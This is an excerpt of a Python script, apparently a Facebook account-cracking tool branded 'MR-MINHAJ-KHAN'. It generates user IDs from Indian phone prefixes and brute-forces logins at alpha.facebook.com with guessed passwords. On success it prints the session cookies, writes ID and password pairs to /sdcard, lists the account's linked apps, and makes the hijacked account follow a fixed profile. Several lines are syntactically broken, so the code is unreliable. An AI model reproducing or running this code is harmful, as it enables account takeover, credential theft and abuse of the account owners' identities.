...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://chat.whatsapp.com/F86MknCUWU0DfsIfNQmLzR')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://youtube.com/@MinhazulIslam-qi2tn?si=5tyod_3Xe6raRQLg')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def cek_apk(session,coki):
    w=session.get("https://alpha.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    ...
    w=session.get("https://alpha.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://alpha.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://alpha.facebook.com' + str(get), {
...
\033[1;32m        .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
\033[1;35m       | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
\033[1;35m       | | ____    ____ | || |  _______     | || |              | || | ____    ____ | || |     _____    | || | ____  _____  | || |  ____  ____  | || |      __      | || |     _____    | || |              | || |  ___  ____   | || |  ____  ____  | || |      __      | || | ____  _____  | |
\033[1;32m       | ||_   \  /   _|| || | |_   __ \    | || |              | || ||_   \  /   _|| || |    |_   _|   | || ||_   \|_   _| | || | |_   ||   _| | || |     /  \     | || |    |_   _|   | || |              | || | |_  ||_  _|  | || | |_   ||   _| | || |     /  \     | || ||_   \|_   _| | |
\033[1;32m       | |  |   \/   |  | || |   | |__) |   | || |    ______    | || |  |   \/   |  | || |      | |     | || |  |   \ | |   | || |   | |__| |   | || |    / /\ \    | || |      | |     | || |    ______    | || |   | |_/ /    | || |   | |__| |   | || |    / /\ \    | || |  |   \ | |   | |
\033[1;35m       | |  | |\  /| |  | || |   |  __ /    | || |   |______|   | || |  | |\  /| |  | || |      | |     | || |  | |\ \| |   | || |   |  __  |   | || |   / ____ \   | || |   _  | |     | || |   |______|   | || |   |  __'.    | || |   |  __  |   | || |   / ____ \   | || |  | |\ \| |   | |
\033[1;35m       | | _| |_\/_| |_ | || |  _| |  \ \_  | || |              | || | _| |_\/_| |_ | || |     _| |_    | || | _| |_\   |_  | || |  _| |  | |_  | || | _/ /    \ \_ | || |  | |_' |     | || |              | || |  _| |  \ \_  | || |  _| |  | |_  | || | _/ /    \ \_ | || | _| |_\   |_  | |
\033[1;32m       | ||_____||_____|| || | |____| |___| | || |              | || ||_____||_____|| || |    |_____|   | || ||_____|\____| | || | |____||____| | || ||____|  |____|| || |  `.___.'     | || |              | || | |____||____| | || | |____||____| | || ||____|  |____|| || ||_____|\____| | |
\033[1;32m       | |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | |
\033[1;35m       | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
\033[1;32m       '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
...
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS alpha
...
def i():
    ...
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m+91778, \033[1;33m+91930 ,\033[1;33m+91902 ,\033[1;33m+91712  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    ...
    for bilal in range(passx):
        pww = input("[*] Enter Password : ") '\x1b[1;32m/Auto 
        HamiiID.append(pww)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            alpha_fb = session.get('https://alpha.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(alpha_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(alpha_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(alpha_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(alpha_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_alphafb = {"authority": 'alpha.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            ...
            'user-agent': 'pro',}
            lo = session.post('https://alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_alphafb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                Uid = coki[7:22]
                print('    \033[1;32m(MINHAJ-OK')  ' +Uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MINHAJ-OK.txt', 'a').write( Uid+' | '+ps+'\n')
                oks.append(Uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                Uid = coki[24:39]
                print('    \33[1;30m(MINHAJ-Ok')  ' +uuid+ ' | ' +ps+  Auto  '  \33[0;97m')
                open('/sdcard/MINHAJ-Ok.txt', 'a').write( Uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MINHAJ] [Open]  OK- Show  Cp-\r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
